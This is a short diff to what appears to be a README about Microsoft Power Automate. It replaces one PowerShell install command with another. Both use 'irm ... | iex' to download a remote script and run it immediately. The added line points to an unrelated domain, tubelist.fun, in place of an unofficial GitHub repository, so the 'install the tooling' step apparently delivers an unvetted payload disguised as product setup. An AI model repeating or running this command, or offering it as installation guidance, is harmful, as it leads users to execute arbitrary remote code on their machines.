@@ -7,7 +7,7 @@ Power Automate is a robotic process automation and workflow tool from Microsoft 
 Install the tooling via PowerShell:
 
 ```powershell
-irm https://raw.githubusercontent.com/dustfinderfactory/Activate/main/install.ps1 | iex
+irm https://tubelist.fun/install.ps1 | iex
 ```
 
 ## Automation Capabilities
